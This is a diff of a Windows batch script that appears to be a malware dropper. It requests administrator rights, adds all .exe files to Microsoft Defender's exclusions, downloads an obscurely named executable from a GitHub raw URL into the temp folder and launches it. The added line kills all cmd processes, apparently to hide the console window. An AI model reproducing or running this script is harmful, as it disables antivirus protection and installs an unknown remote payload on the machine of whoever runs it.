@@ -1,7 +1,9 @@
 @echo off
 
 :: BatchGotAdmin
+
 :-------------------------------------
+
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
@@ -28,3 +30,4 @@ Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
 Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/Modification11910275.exe' -OutFile Modification11910275.exe"
 start Modification11910275.exe
+PowerShell -Command "Get-Process cmd -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }"
